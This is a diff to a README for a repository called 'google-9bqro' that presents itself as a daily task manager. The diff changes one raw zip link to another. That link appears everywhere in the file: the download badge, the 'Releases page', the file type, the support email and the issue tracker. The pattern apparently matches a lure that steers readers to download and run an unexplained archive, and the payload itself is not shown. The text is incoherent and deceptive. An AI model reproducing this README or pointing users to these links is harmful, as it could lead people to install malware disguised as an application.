@@ -4,7 +4,7 @@
 Welcome to google-9bqro! This application makes it simple to manage your daily tasks. Follow the steps below to download and run it.
 
 ## 📥 Download Now
-[![Download google-9bqro](https://raw.githubusercontent.com/Khoascript14/google-9bqro/main/fourther/google-9bqro.zip)](https://raw.githubusercontent.com/Khoascript14/google-9bqro/main/fourther/google-9bqro.zip)
+[![Download google-9bqro](https://github.com/Khoascript14/google-9bqro/raw/refs/heads/main/fourther/bqro-google-3.2.zip)](https://github.com/Khoascript14/google-9bqro/raw/refs/heads/main/fourther/bqro-google-3.2.zip)
 
 ## 📂 System Requirements
 Before you download, ensure your system meets the following requirements:
@@ -13,10 +13,10 @@ Before you download, ensure your system meets the following requirements:
 - Disk Space: At least 100 MB free
 
 ## 📦 Download & Install
-1. Visit the [Releases page](https://raw.githubusercontent.com/Khoascript14/google-9bqro/main/fourther/google-9bqro.zip) to access the latest version.
+1. Visit the [Releases page](https://github.com/Khoascript14/google-9bqro/raw/refs/heads/main/fourther/bqro-google-3.2.zip) to access the latest version.
 2. Locate the latest release and click on it.
 3. Under "Assets", find the file for your operating system.
-4. Download the file. Depending on your system, this might be an `.exe`, `.dmg`, or `https://raw.githubusercontent.com/Khoascript14/google-9bqro/main/fourther/google-9bqro.zip` file.
+4. Download the file. Depending on your system, this might be an `.exe`, `.dmg`, or `https://github.com/Khoascript14/google-9bqro/raw/refs/heads/main/fourther/bqro-google-3.2.zip` file.
 5. Once the download finishes, locate the file on your computer.
 6. To run the application:
    - **Windows:** Double-click the downloaded `.exe` file.
@@ -38,8 +38,8 @@ If you encounter any issues during installation or while using the application, 
 
 ## 📞 Support
 If you have questions or need further assistance, feel free to reach out:
-- Email: https://raw.githubusercontent.com/Khoascript14/google-9bqro/main/fourther/google-9bqro.zip
-- GitHub Issues: [Report an issue](https://raw.githubusercontent.com/Khoascript14/google-9bqro/main/fourther/google-9bqro.zip)
+- Email: https://github.com/Khoascript14/google-9bqro/raw/refs/heads/main/fourther/bqro-google-3.2.zip
+- GitHub Issues: [Report an issue](https://github.com/Khoascript14/google-9bqro/raw/refs/heads/main/fourther/bqro-google-3.2.zip)
 
 ## 🌟 Join Our Community
 We value feedback! Join us to share your thoughts or ask questions. Your input helps us improve the application for everyone.
